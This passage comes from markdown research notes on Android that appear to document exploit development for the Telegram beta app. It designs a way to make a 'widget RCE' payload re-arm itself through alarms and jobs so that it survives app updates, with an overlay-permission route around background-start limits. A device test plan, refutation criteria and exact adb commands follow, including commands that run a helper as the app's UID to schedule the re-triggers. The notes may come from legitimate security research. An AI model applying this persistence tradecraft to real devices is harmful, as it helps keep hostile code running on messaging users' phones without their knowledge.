(`notes/persistence_local_existing_rce.md` §1-2). It is the only self-contained
“after update, no UI” mechanism in the project, but the current device test
crashes in `InitializeClass` and is not a working trigger. If it is fixed, an
alarm broadcast / job / boot receiver is enough to run it; the widget chat is
not needed. Do not conflate this with the widget RCE.

### 6.5 Re-arm loop and failure handling

* The alarm is one-shot. The payload must schedule the next alarm every time it
  runs; otherwise the chain stops after one re-trigger.
* If `am force-stop` is used (by the installer, an optimizer, or the user), the
  alarm and jobs are removed. The re-arm must then come from a boot-time code
  stage that is still alive, or from the next user-assisted chat open.
* An update that **uninstalls** (different signing key, `adb uninstall`) clears
  data and removes the payload; the test must use the same key.
* An alarm set with `setExact*` can be removed on update if the app loses
  `SCHEDULE_EXACT_ALARM`; use `set()`/`setWindow()`/`setAndAllowWhileIdle()` or
  check the app-op and re-arm.
* In Doze/App Standby an inexact alarm may be deferred; for a test, keep the
  device awake or grant exact-alarm access. This affects timing, not survival.

---

## 7. Device test plan (summary)

Full commands and refutation criteria:
`lab/post_update_retrigger/device_test_plan.md`. The minimum sequence for the
Sony:

1. **T0 baseline:** `adb shell am start -n .../LaunchActivity -a VIEW -d
   'tg://openmessage?chat_id=<CHAT_ID>&message_id=79415'`; confirm the widget
   runs. This proves the deep link, not the alarm.
2. **T1 alarm survival:** helper `broadcast 120`; `dumpsys alarm`; `adb install
   -r` same key; wait; expect the alarm to fire and `am_proc_start`/
   `AppStartReceiver`/`NotificationsService`, no chat.
3. **T2 BAL control:** helper `activity 120` with `SYSTEM_ALERT_WINDOW=default`;
   update; expect `Background activity start [...]` abort and no chat.
4. **T3 positive:** `appops set ... SYSTEM_ALERT_WINDOW allow`; helper `activity
   120`; update; expect the overlay allowed line, LaunchActivity, chat at 79415,
   `widget height ... running`, proof file rewritten.
5. **T4 job survival:** helper `job 120`; `dumpsys jobscheduler`; update; expect
   job present/run; no UI.
6. **T5 force-stop control:** helper `all 300`; `am force-stop`; expect alarms
   and jobs gone, no delivery.
7. **T6 no-update baseline:** helper `activity 60`; expect delivery/chat (with
   overlay) without an update.
8. **T7 boot/`MY_PACKAGE_REPLACED` control:** reboot; expect `AppStartReceiver`
   push start, no chat; `grep -c MY_PACKAGE_REPLACED` = 0.

Do **not** clear app data between T1/T3; the widget message and the app-op must
survive. Record the exact APK SHA-256 and versionCode; a different signing key
forces an uninstall and invalidates the test.

---

## 8. Confidence and refutation criteria

**High confidence (AOSP source):**

* alarms are kept on update and removed on force-stop/uninstall
  (`AlarmManagerService.java:5151-5182`);
* PendingIntents are not cancelled on update
  (`PendingIntentController.java:174-190`, `ActivityManagerService.java:4537-4540`);
* jobs are kept on update and cancelled on force-stop/uninstall
  (`JobSchedulerService.java:903-980`, `JobStore.java:150`);
* AlarmManager explicitly disables BAL for its activity PendingIntents
  (`AlarmManagerService.java:1871-1876`, `:4824-4832`);
* `ActivityStarter` blocks the start unless a BAL exemption applies
  (`ActivityStarter.java:1278-1530`); `SYSTEM_ALERT_WINDOW` is the only
  normal-app exemption Telegram could hold (`:1463-1468`);
* Telegram has no `MY_PACKAGE_REPLACED` receiver; `AppStartReceiver` starts
  push only; `OpenChatReceiver`/`BringAppForegroundService` are BAL-subject
  activities/services; message notifications have no FSI.

**Not yet proven (device):**

* Sony’s installer sends `PACKAGE_REMOVED(replacing=true)` and does not
  force-stop; the AOSP source says it does, but an OEM/installer variant could
  differ (T1);
* `app_process` as UID 10357 on the Sony; the helper’s reflection signatures
  and `IAlarmManager.set` acceptance (T1);
* `SYSTEM_ALERT_WINDOW` default on the Sony and the positive T3;
* `tg://openmessage?chat_id=<CHAT_ID>&message_id=79415` opens exactly at the
  widget cell (T0; the existing T8 only used `chatId`, not `message_id`);
* the widget message 79415 survives the update and runs the payload again (T3);
* job survival on the Sony (T4; `KeepAliveJob` may no-op if the app is already
  running).

**A possible alternative that would remove the overlay requirement (open
item, not used):** `MessageObject.I()` on a live widget `MessageObject` calls
`n0()` which can build `wv` and start the sandbox without a chat cell
(`notes/update_widget_cache.md` §4.4). If an alarm broadcast starts the app
process, and a subsequent server update that reaches that live object (e.g. a
user-name or text edit) calls `I()`, the widget could run in the background.
The dialog-list last-message object was not observed through `I()`/`n0()` on a
cold start, and the trigger would be server/update-dependent; it is not part of
the local design. It is the only code path found that could make a broadcast
alarm sufficient without `SYSTEM_ALERT_WINDOW`.

**What would refute the design:**

* the alarm is gone immediately after `adb install -r` and no
  `PACKAGE_RESTARTED`/force-stop is needed → update survival is false on this
  ROM;
* the activity starts with `SYSTEM_ALERT_WINDOW=default` → the BAL analysis is
  wrong for this ROM (capture the `Background activity start` line and the
  real calling UID);
* the overlay-allowed T3 still aborts → the alarm PI/options or the app-op
  check is not what the source says;
* T0 opens the chat but the widget does not run → the message cell is not bound
  (scroll/DB/deleted message); this is a payload/DB issue, not an alarm issue.

**No false claims:** the alarm/job survival is a **source-level** result; the
end-to-end re-trigger is a **conditional design** whose positive path requires
`SYSTEM_ALERT_WINDOW`. Without overlay, this note found no autonomous no-root
way to open the widget chat; the alternatives are user-assisted or external.

---

## 9. Appendix — exact commands and refs

### 9.1 Deep link / component

```sh
PKG=org.telegram.messenger.beta
# measured: chat_id does not navigate for this user chat; user_id does
adb shell am start -n $PKG/org.telegram.ui.LaunchActivity \
  -a android.intent.action.VIEW \
  -d 'tg://openmessage?user_id=<CHAT_ID>&message_id=79415'
```

`OpenChatReceiver`:

```sh
adb shell am start -n $PKG/org.telegram.messenger.OpenChatReceiver \
  -a com.tmessages.openchat --el chatId <CHAT_ID>
```

Inspect the manifest:

```sh
aapt2 dump xmltree <apk> --file AndroidManifest.xml | \
  grep -E 'LaunchActivity|OpenChatReceiver|AppStartReceiver|MY_PACKAGE_REPLACED'
```

### 9.2 Alarm/job survival

```sh
# Retrigger2 is in lab/loader_update_trigger_audit/helper/ (same app_process
# approach; modes user, job, jobp, service, wake)
./lab/loader_update_trigger_audit/helper/build.sh
adb push lab/loader_update_trigger_audit/helper/out/classes.dex \
  /data/user/0/org.telegram.messenger.beta/files/retrigger2.dex
# schedule as UID 10357 (app-UID C2, or the lab su 10357 shortcut)
adb shell "su 10357 -c 'CLASSPATH=/data/user/0/org.telegram.messenger.beta/files/retrigger2.dex \
  ANDROID_ROOT=/system ANDROID_DATA=/data /system/bin/app_process /system/bin \
  org.telegram.retrigger2.Retrigger2 user 120 org.telegram.messenger.beta <CHAT_ID> <CHAT_ID>'"
adb shell "su 10357 -c '... Retrigger2 jobp 300 org.telegram.messenger.beta <CHAT_ID> <CHAT_ID>'"
adb shell dumpsys alarm | grep -A8 -B3 org.telegram.messenger.beta
adb shell dumpsys jobscheduler | grep -A15 -B3 org.telegram.messenger.beta
adb logcat -c
adb install -r <same-key.apk>
sleep 360
adb logcat -d -v threadtime > post_update.log
adb shell dumpsys alarm | grep -A8 -B3 org.telegram.messenger.beta
adb shell dumpsys jobscheduler | grep -A15 -B3 org.telegram.messenger.beta
```

`jobp` is the only mode that writes a `PERSISTED` job to
`/data/system/job/jobs.xml`; `job` does not survive a reboot.

### 9.3 Overlay / BAL

```sh
adb shell appops get $PKG SYSTEM_ALERT_WINDOW
adb shell appops set $PKG SYSTEM_ALERT_WINDOW allow    # T3
adb shell appops set $PKG SYSTEM_ALERT_WINDOW default  # T2 / cleanup
adb logcat -d -v threadtime | grep -E 'Background activity start|SYSTEM_ALERT_WINDOW'
```

### 9.4 Source refs

AOSP files and line citations: `lab/post_update_retrigger/aosp/EXCERPTS.md`.
Telegram smali excerpts: `lab/post_update_retrigger/smali_refs/*.txt`.
Manifest dump: `lab/post_update_retrigger/manifest_72799_full.txt`.
Device commands: `lab/post_update_retrigger/device_test_plan.md`; measured run:
`lab/post_update_retrigger/device/20261103/RESULTS.md`.
Helper: `lab/post_update_retrigger/helper/{Retrigger.java,Retrigger2.java,build.sh,build2.sh,run_helper.sh,run_helper2.sh,README.md}`.
